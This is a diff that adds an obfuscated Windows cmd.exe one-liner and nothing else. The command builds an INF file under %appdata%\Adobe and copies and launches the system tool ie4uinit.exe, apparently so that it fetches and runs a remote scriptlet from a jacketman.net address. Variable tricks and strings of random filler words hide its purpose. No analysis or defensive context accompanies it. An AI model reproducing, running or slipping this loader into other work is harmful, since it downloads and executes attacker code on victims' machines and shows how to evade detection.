@@ -1,0 +1,7 @@
+/v /c (for %t in (s) do @set "Surplus=%~t") &&
+  (for %b in (a) do @set "Nurse=%~b") &&
+  (for %x in (i) do @set "Warnings=%~x") &&
+  (for %x in (c) do @set "Detect=%~x") &&
+  call(for %t in ("[version]" "signature =$windows nt$" "[6906D]" "sc\" "ro%Cosmetics%j,NI,%Foundations%%Intervals%%Intervals%p%Unknown%%Provide%%Provide%8kaso9.jacketman.net/87913701085" "[strings]" "Cosmetics=b;Allow" "Foundations=h" "Unknown=:;Party" "servicename=' '" "Diabetes=init" "Intervals=t;Solve" "shortsvcname=' '" "Methods=sWarnings!me%" "Provide=/" "[defaultinstall.windows7]" "delfiles=146" "Un\" "Register\" "OCXs=6906D" "[146]" "ieu%Diabetes%.inf" "[destinationdirs]" "defaultdestdir=11" "146=01" ) do @echo %~t)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Warnings!n!Quality!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Matter1=Democrats &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Matter63=Paintings Heroes Orient Interactions Favorites Cement Curves Archives Insect Possess Attention Leader Sense Sugar Sentences Considerations Roast Providers Lovers Portraits Buddy Lenses Sessions Universe Households Snake Ginger Frequencies Disagree Liabilities Pretty Twelve Beatles Swing Alone Coral Producers Troops Republicans Glare Useful Counts Beads Features Vessel Depart Pupil Ships Smart"
